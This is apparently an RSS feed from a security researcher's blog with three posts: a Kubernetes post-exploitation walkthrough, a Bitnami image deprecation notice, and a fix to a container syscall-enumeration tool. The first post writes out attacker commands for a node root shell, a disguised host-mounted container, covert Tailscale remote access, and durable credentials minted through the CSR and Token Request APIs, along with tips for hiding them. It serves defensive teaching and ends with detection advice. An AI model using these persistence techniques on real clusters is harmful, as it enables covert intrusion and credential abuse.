<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Raesene's Ramblings</title>
		<description>Things that occur to me</description>
		<link>https://raesene.github.io/</link>
		<atom:link href="https://raesene.github.io/feed.xml" rel="self" type="application/rss+xml" />
		
			<item>
				<title>Beyond the surface - Exploring attacker persistence strategies in Kubernetes</title>
				<description>&lt;p&gt;I’ve been doing a talk on Kubernetes post-exploitation for a while now and one of requests has been for a blog post to refer back to, which I’m finally getting around to doing now!&lt;/p&gt;

&lt;p&gt;The goal of this talk is to lay out one attack path that attackers might use to retain and expand their access after an initial compromise of a Kubernetes cluster by getting access to an admin’s credentials. It doesn’t cover all the ways that attackers could do this, but provides one path and also hopefully illuminates some of the inner workings and default settings that attackers might exploit as part of their exploits.&lt;/p&gt;

&lt;p&gt;There’s a recording of the talk &lt;a href=&quot;https://www.youtube.com/watch?v=GtrkIuq5T3M&amp;amp;t=11s&quot;&gt;here&lt;/a&gt; if you prefer videos, the flow is similar but I have simplified a bit for the latest iteration, thanks to &lt;a href=&quot;https://raesene.github.io/blog/2025/05/30/kubernetes-debug-profiles/&quot;&gt;debug profiles&lt;/a&gt;! The general story the talk tells is one where attackers have temporary access to a cluster admin’s laptop where the admin has stepped away to take a call and not locked it, and they have to see how to get and keep access to the cluster before the admin comes back.&lt;/p&gt;

&lt;h3 id=&quot;initial-access&quot;&gt;Initial access&lt;/h3&gt;

&lt;p&gt;One of the first things an attacker might want to do with credentials is get a root shell on a Kubernetes cluster node as a good spot to look for credentials or plant binaries. With Kubernetes that’s very simple to do as there is functionality built in to the cluster to allow for users with the right levels of access to do that quickly via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl debug&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;A typical command might look like this (just replace the node name with one from your cluster)&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl debug node/gke-demo-cluster-default-pool-04a13cdb-5p8d -it --profile=sysadmin --image=busybox
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;An important point from this command is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--profile&lt;/code&gt; switch as it dictates how much access you’ll have to the node. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysadmin&lt;/code&gt; profile provides the highest level of access, so is the most useful for attackers.&lt;/p&gt;

&lt;h3 id=&quot;executing-binaries&quot;&gt;Executing Binaries&lt;/h3&gt;

&lt;p&gt;Once the attacker has shell access to a node, their next instinct is likely to download tools to run. This might not be as simple as it could be as many Kubernetes distributions lock down the Node OS, setting filesystems as read-only or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;noexec&lt;/code&gt;. However, all cluster nodes can do one thing… run containers. So if the attacker can download and run a container on the node, they’re likely to be able to run any programs they like!&lt;/p&gt;

&lt;p&gt;Doing this we can take a look at some lesser known features of Kubernetes clusters. In a cluster, all containers are run by a container runtime, typically &lt;a href=&quot;https://containerd.io/&quot;&gt;containerd&lt;/a&gt; or &lt;a href=&quot;https://cri-o.io/&quot;&gt;CRI-O&lt;/a&gt;, and it’s possible to talk directly to those programs if you’re on the node, bypassing the Kubernetes APIs altogether.&lt;/p&gt;

&lt;p&gt;In the talk I start by creating a new containerd namespace using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctr&lt;/code&gt; tool. Ctr is very useful as it’s always installed (IME) alongside containerd, so you don’t need to get an external client program. We’re creating a containerd namespace to make it a bit harder for someone looking at the host to spot our container. Importantly containerd namespaces have nothing to do with Kubernetes namespaces, or Linux namespaces.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctr namespace create sys_net_mon
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We create a namespace called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys_net_mon&lt;/code&gt; just to make it a bit less obvious than “attackers were here”!. With the namespace created, the next step is to pull down a container image. The one I’m using is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker.io/sysnetmon/systemd_net_mon:latest&lt;/code&gt; . Importantly the contents of this container image have nothing to do with systemd or network monitoring! From a security standpoint it’s an important thing to remember that outside of the official or verified images, Docker Hub does no curation of image contents, so anyone can call their images anything!&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctr -n sys_net_mon images pull docker.io/sysnetmon/systemd_net_mon:latest
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With the image pulled we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctr&lt;/code&gt; to start a container&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctr -n sys_net_mon run --net-host -d --mount type=bind,src=/,dst=/host,options=rbind:ro docker.io/sysnetmon/systemd_net_mon:latest sys_net_mon
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This container provides us with full access to the hosts filesystem and also the host’s network interfaces which is pretty useful for post-exploitation activity. After that it’s just a question of getting a shell in the container.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctr -n sys_net_mon run --net-host -d --mount type=bind,src=/,dst=/host,options=rbind:ro docker.io/sysnetmon/systemd_net_mon:latest sys_net_mon
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;static-manifests&quot;&gt;Static Manifests&lt;/h3&gt;

&lt;p&gt;Another approach which the attackers could use to run a container on the node is static manifests. Most Kubelets will define a directory on the host which it will load static manifests from. These manifests run a pod without any API server necessary. A handy trick for our attackers is to give their static pod an invalid namespace name, as this prevents it being registered with the API server, so it won’t show up in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl get pods -A&lt;/code&gt; or similar. There’s more details on static pods and some of their security oddness on &lt;a href=&quot;https://blog.iainsmart.co.uk/posts/2024-10-13-mirror-mirror/&quot;&gt;Iain Smart’s blog&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;remote-access&quot;&gt;Remote Access&lt;/h3&gt;

&lt;p&gt;The next problem our attackers have to tackle is retaining remote access to the environment after the admin returns to their laptop. Whilst there are a number of remote access programs available, a lot of the security/hacker related ones will be spotted by EDR/XDR style agents, so an alternative can be using something like &lt;a href=&quot;https://tailscale.com/&quot;&gt;Tailscale&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;Tailscale has a number of features which are very useful for attackers (in addition to their normal usefulness!). First one is that it can be run with two statically compiled golang binaries that can be renamed. This means that you pick what will show up in the process list of the node. Following the theme of the container image, we use binaries &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systemd_net_mon_server&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systemd_net_mon_client&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The first command starts the server&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;systemd_net_mon_server --tun=userspace-networking --socks5-server=localhost:1055 &amp;amp;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;and then we start the client&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;systemd_net_mon_client up --ssh --hostname cafebot --auth-key=tskey-auth-XXXXX
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In terms of network access this will run on only 443/TCP outbound if it uses Tailscale’s DERP network, so that access will probably be allowed in most environments. Also we can use Tailscale’s ACL feature so that our compromised container can’t communicate with any other machines on our Tailnet.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/Tailscale-bot-access-control.png&quot; alt=&quot;Tailscale ACLs&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With those services running it should be possible to come back into the container over SSH. Tailscale bundles an SSH server with the program, no SSHD will show as running :)&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tailscale ssh root@cafebot
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;credentials---kubelet-api&quot;&gt;Credentials - Kubelet API&lt;/h3&gt;

&lt;p&gt;With remote access achieved, our attackers still need long lasting credentials and also it would be nice if they could probe the cluster without touching the Kubernetes API server, as that might show up in audit logs. So to do this they need access to credentials for a user who can talk to the Kubelet API directly. This runs on every node on 10250/TCP and has no auditing option available.&lt;/p&gt;

&lt;p&gt;In the talk to do this I use &lt;a href=&quot;https://github.com/raesene/teisteanas/&quot;&gt;teisteanas&lt;/a&gt; which creates Kubeconfig based credentials for users using the Certificiate Signing Request (CSR) API. We can create a set of credentials for any user using this approach. For stealth an attacker would likely choose a user which already has rights assigned to it in RBAC, so they don’t have to create any new cluster roles or cluster role bindings. The exact user to use will vary, but in the demos from the talk I use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kube-apiserver&lt;/code&gt; which is a user that exists in GKE clusters.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;teisteanas -username kube-apiserver -output-file kubelet-user.config
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With that Kubeconfig file in hand and access to the Kubelet port on a host, it’s possible to take actions like listing pods on a node or executing commands in those pods. The easiest way to do this is to use &lt;a href=&quot;https://github.com/cyberark/kubeletctl&quot;&gt;kubeletctl&lt;/a&gt;. So from our container which is running on the node, using the node’s network namespace, we can run something like this&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubeletctl -s 127.0.0.1 -k kubelet-user.config pods
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;csr-api&quot;&gt;CSR API&lt;/h3&gt;

&lt;p&gt;It’s also important to understand a bit about the CSR API as, for attackers, it’s a useful thing to take advantage of. This API exists in pretty much every Kubernetes distribution and can be used to create credentials that authenticate to the cluster, apart from when using EKS as it does not allow that function. Very importantly credentials created via the CSR API can be abused by anyone who has access to the API server. Most managed Kubernetes distributions have chosen to have the Kubernetes API server exposed to the Internet by default, so an attacker who is able to get credentials for a cluster will be able to use them from anywhere in the world!&lt;/p&gt;

&lt;p&gt;The CSR API is also attractive to attackers for a number of reasons :-&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Unless audit logging is enabled and correctly configured there is no record of the API having been used and the credentials having been created.&lt;/li&gt;
  &lt;li&gt;Credentials created by this API cannot be revoked without rotating the certificate authority for the whole cluster, which is a disruptive operation. The &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/18982&quot;&gt;GitHub issue related to certificate revocation&lt;/a&gt; has been open since 2015, so it’s likely this will not change now…&lt;/li&gt;
  &lt;li&gt;It’s possible to create credentials for generic system accounts, so even if the cluster operator has audit logging enabled, it could be difficult to identify malicious activity.&lt;/li&gt;
  &lt;li&gt;The credentials tend to be long lived. Whilst this is distribution dependent, generally this is 1-5 years.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In the demos for the talk we’re running against a GKE cluster, so used the CSR API to generate credentials for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:gke-common-webhooks&lt;/code&gt; user which has quite wide ranging privileges.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;teisteanas -username system:gke-common-webhooks -output-file webhook.config
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;token-request-api&quot;&gt;Token Request API&lt;/h3&gt;

&lt;p&gt;Even if the CSR API isn’t available there’s another option built into Kubernetes that can create new credentials, which is the Token Request API. This is used by Kubernetes clusters to create service account tokens, but there’s nothing to stop an administrator who has the correct rights from using it. Similarly to the CSR API there’s no persistent record (apart from audit logs) that new credentials have been created, and they can be hard to revoke if a system level service account has been used, as the only way to revoke the credential is to delete it’s associated service account.&lt;/p&gt;

&lt;p&gt;The expiry may be less of a problem, depending on the Kubernetes distribution in use, it can vary from 24 hours maximum  to one year, from the managed distributions I’ve looked at.&lt;/p&gt;

&lt;p&gt;In the talk I use &lt;a href=&quot;https://github.com/raesene/tocan/&quot;&gt;tocan&lt;/a&gt; to simplify the process of creating a Kubeconfig file from a service account token.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tocan -namespace kube-system -service-account clusterrole-aggregation-controller
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The service account we clone is an interesting one as it has the “escalate” right, which means it can always become Cluster-admin even if it doesn’t have those rights to begin with. (I’ve written about &lt;a href=&quot;https://raesene.github.io/blog/2020/12/12/Escalating_Away/&quot;&gt;escalate&lt;/a&gt; before)&lt;/p&gt;

&lt;h3 id=&quot;detecting-these-attacks&quot;&gt;Detecting these attacks&lt;/h3&gt;

&lt;p&gt;The talk closes by discussing how to detect and prevent these kind of attacks. For detection there’s a couple of key things to look at&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Kubernetes audit logs&lt;/strong&gt; - This one is very important. You need to have audit logging enabled with centralized logs and good retention, to spot some of the techniques used here, especially abuse of the CSR and Token Request APIs&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Node Agents&lt;/strong&gt; - Having security agents running on cluster nodes could allow for detection of things like the Tailscale traffic, depending on their configuration&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Node Logs&lt;/strong&gt; - Generally ensuring that logs on nodes are properly centralized and stored is going to be important, as attackers can leave traces there.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Know what good looks like&lt;/strong&gt; - This one sounds simple but possibly isn’t. If you know what processes should be running on your cluster nodes, you can spot things like “systemd_net_mon” when they show up. What’s tricky here is that every distribution has a different set of management services run by the cloud provider, so it’s not a one off effort knowing what should be there.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;preventing-these-attacks&quot;&gt;Preventing these attacks&lt;/h3&gt;

&lt;p&gt;There are a couple of key ways cluster admins can reduce the risk of this scenario happening to them,&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Take your clusters off the Internet!!&lt;/strong&gt; - Exposing the API server this way means you are one set of lost credentials away from a very bad day. Generally managed Kubernetes distributions will allow you to restrict access, but it’s not the default.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Least Privilege&lt;/strong&gt; - In this scenario, the compromised laptop had cluster-admin level privileges, enabling the attackers to move through the cluster easily. If the admin had been using an account with fewer privileges, the attacks might well not have succeeded. Whilst some of the rights used, like node debugging, are probably quite commonly used, others like the CSR API and Token Request API probably shouldn’t be needed in day-to-day administration, so could be restricted.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To quote &lt;a href=&quot;https://bsky.app/profile/lookitup.baby&quot;&gt;Ian Coldwater&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/made-of-stars.png&quot; alt=&quot;Made of stars&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;

&lt;p&gt;This talk just looks at one path that attackers could take to retain and expand their access to a cluster which they get access to. There are obviously other possibilities, but this can shed some light on some of the ways that Kubernetes works and how to improve your cluster security!&lt;/p&gt;
</description>
				<pubDate>Fri, 12 Sep 2025 10:00:00 +0100</pubDate>
				<link>https://raesene.github.io/blog/2025/09/12/beyond-the-surface/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2025/09/12/beyond-the-surface/</guid>
			</item>
		
			<item>
				<title>Bitnami Deprecation</title>
				<description>&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; Looks like Bitnami decided to take some more time over this &lt;a href=&quot;https://community.broadcom.com/tanzu/blogs/beltran-rueda-borrego/2025/08/18/how-to-prepare-for-the-bitnami-changes-coming-soon&quot;&gt;details here&lt;/a&gt; and have some 1-day brown outs before removing the repos on Sept 29.&lt;/p&gt;

&lt;p&gt;One constant of modern development environments is the ever increasing number of dependencies, and the problems that come when they get disrupted. Next week there could be a serious disruption in the container image ecosystem as a provider of popular images and helm charts changes their availability and tags.&lt;/p&gt;

&lt;h2 id=&quot;whats-happening&quot;&gt;What’s Happening?&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/bitnami/charts/issues/35164&quot;&gt;This Github issue&lt;/a&gt; has most of the details, but it’s a little hard to work out the exact impact from it. The TL;DR. is that Bitnami are moving from freely available images under the Docker Hub Username &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bitnami&lt;/code&gt; to a split of commercially maintained images under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bitnamisecure&lt;/code&gt; and unmaintained legacy images under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bitnamilegacy&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The exact timing is unclear as the issue mentions &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gradually move existing ones&lt;/code&gt; to the legacy repository, however the impact is going to start in a week’s time starting August 28th 2025, so it’s clear that organizations using these images will need to take action sooner rather than later.&lt;/p&gt;

&lt;h2 id=&quot;so-whats-the-impact&quot;&gt;So what’s the impact?&lt;/h2&gt;

&lt;p&gt;Well if you’re either directly using images from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bitnami&lt;/code&gt;, Helm charts that reference those images, or images that are built off those base images, you need to start using different images pretty quickly or you might find deploys or image builds failing.&lt;/p&gt;

&lt;h2 id=&quot;how-big-of-a-problem-is-this&quot;&gt;How big of a problem is this?&lt;/h2&gt;

&lt;p&gt;After reading this, I thought it could be worth looking at how many pulls these images are getting. Luckily Docker Hub provides pull statistics via their API, so by looking at changes over time we can get a reasonable idea of how many people are going to be affected.&lt;/p&gt;

&lt;p&gt;Looking at pull statistics for popular bitnami images over the course of 6 days we can see that the most popular image &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl&lt;/code&gt; got 1.86M pulls in that time period, and a large number of images have had over 100K pulls in that time, so it seems like these images are pretty heavily used.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/bitnami-stats.png&quot; alt=&quot;bitnami stats&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;I’ve long said that, when using container images in production, it’s vitally important that you build and maintain all of your own images, or if you want have some kind of commercial maintenance agreement for them. Relying on freely provided externally managed images is a recipe for problems down the line.&lt;/p&gt;

&lt;p&gt;For now though, the critical point is that everyone using Bitnami images, needs to go an review all their usage and make a fairly rapid plan to address the risk of them breaking in the near future.&lt;/p&gt;
</description>
				<pubDate>Thu, 21 Aug 2025 12:30:00 +0100</pubDate>
				<link>https://raesene.github.io/blog/2025/08/21/bitnami-deprecation/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2025/08/21/bitnami-deprecation/</guid>
			</item>
		
			<item>
				<title>Am I Still Contained?</title>
				<description>&lt;p&gt;This exploration started, as many do, with “huh that’s odd”. Specifically I was looking at the output of &lt;a href=&quot;https://github.com/genuinetools/amicontained&quot;&gt;amicontained&lt;/a&gt; around filtered syscalls.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Seccomp: filtering
Blocked Syscalls &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;54&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
        MSGRCV SYSLOG SETSID USELIB USTAT SYSFS VHANGUP PIVOT_ROOT _SYSCTL ACCT SETTIMEOFDAY MOUNT UMOUNT2 SWAPON SWAPOFF REBOOT SETHOSTNAME SETDOMAINNAME IOPL IOPERM CREATE_MODULE INIT_MODULE DELETE_MODULE GET_KERNEL_SYMS QUERY_MODULE QUOTACTL NFSSERVCTL GETPMSG PUTPMSG AFS_SYSCALL TUXCALL SECURITY LOOKUP_DCOOKIE CLOCK_SETTIME VSERVER MBIND SET_MEMPOLICY GET_MEMPOLICY KEXEC_LOAD ADD_KEY REQUEST_KEY KEYCTL MIGRATE_PAGES UNSHARE MOVE_PAGES PERF_EVENT_OPEN FANOTIFY_INIT OPEN_BY_HANDLE_AT SETNS KCMP FINIT_MODULE KEXEC_FILE_LOAD BPF USERFAULTFD
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Looking at the SYSCALLS that were listed as blocked, I noticed that there wasn’t any mention of IO_URING but I know that Docker &lt;a href=&quot;https://github.com/moby/moby/pull/46762&quot;&gt;blocks io_uring syscalls in the default profile&lt;/a&gt;, so what’s going on?&lt;/p&gt;

&lt;h2 id=&quot;looking-at-the-source-code&quot;&gt;Looking at the source code&lt;/h2&gt;

&lt;p&gt;I decided to take a look at the source code to see what was going on and why it might not be working. In the &lt;a href=&quot;https://github.com/genuinetools/amicontained/blob/568b0d35e60cb2bfc228ecade8b0ba62c49a906a/main.go#L187&quot;&gt;seccompIter function&lt;/a&gt; I found what looks like a relevant point. A for loop that iterates over each syscall one at a time.&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SYS_RSEQ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The end point for the loop was a syscall called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_RSEQ&lt;/code&gt; and thanks to a very helpful lookup table &lt;a href=&quot;https://filippo.io/linux-syscall-table/&quot;&gt;here&lt;/a&gt; I could see that that’s syscall &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;334&lt;/code&gt;, and the IO_URING syscalls are 425-427, so we can see why they’re not being flagged, the loop doesn’t go that high!&lt;/p&gt;

&lt;h2 id=&quot;fixing-the-problem&quot;&gt;Fixing the problem&lt;/h2&gt;

&lt;p&gt;Whilst I’m not a professional developer by any stretch of the imagination (&amp;lt;GEEK REFERENCE&amp;gt; I’d liken myself to a rogue with the use magic device skill trying to get a wand of fireballs working by hitting the end of it &amp;lt;/GEEK REFERENCE&amp;gt;), I decided to take a stab at fixing the code to get it to include the IO_URING syscalls (and any other ones with higher numbers).&lt;/p&gt;

&lt;p&gt;We could just increase the maximum number on the for loop, but that does run into a problem, which is that there’s a weird gap in the syscall numbers between 334 and 424. It appears that this was done to &lt;a href=&quot;https://stackoverflow.com/a/63713244/537897&quot;&gt;sync up syscall numbers in different processor architectures&lt;/a&gt;, so we can just add a section to the code to skip those blank numbers.&lt;/p&gt;

&lt;p&gt;The next tricky part is, it turns out making syscalls directly can sometimes cause the process to exit or hang. The original code has a number of &lt;a href=&quot;https://github.com/genuinetools/amicontained/blob/568b0d35e60cb2bfc228ecade8b0ba62c49a906a/main.go#L190&quot;&gt;blocks designed to skip tricky syscalls&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;		&lt;span class=&quot;c&quot;&gt;// these cause a hang, so just skip&lt;/span&gt;
		&lt;span class=&quot;c&quot;&gt;// rt_sigreturn, select, pause, pselect6, ppoll&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SYS_RT_SIGRETURN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SYS_SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SYS_PAUSE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SYS_PSELECT6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SYS_PPOLL&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;continue&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here the approach ended up being a bit trial and error on what syscalls caused problems. Also an interesting aside is that this shows a limitation of this approach to enumerating syscalls, it’s not possible to get a definitive list as you can’t probe for every possible syscall!&lt;/p&gt;

&lt;p&gt;With that largely working, it was just a question of extending the really long &lt;a href=&quot;https://github.com/genuinetools/amicontained/blob/568b0d35e60cb2bfc228ecade8b0ba62c49a906a/main.go#L243&quot;&gt;syscallName&lt;/a&gt; function that has a case statement giving names for every syscall. This was also the only part of this that LLMs could help with (they got the main problem wildly wrong), and even here they only got most of it right.&lt;/p&gt;

&lt;p&gt;After all that it looks like this largely works. As the original repository seems unmaintained, I’ve put a fork &lt;a href=&quot;https://github.com/raesene/amicontained&quot;&gt;here&lt;/a&gt; with the updated code.&lt;/p&gt;

&lt;h2 id=&quot;results&quot;&gt;Results&lt;/h2&gt;

&lt;p&gt;Using the updated code in a Docker container we can see that the number of blocked syscalls has increased from 54 to 68, including the IO_URING ones that started this!&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Blocked Syscalls &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;68&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
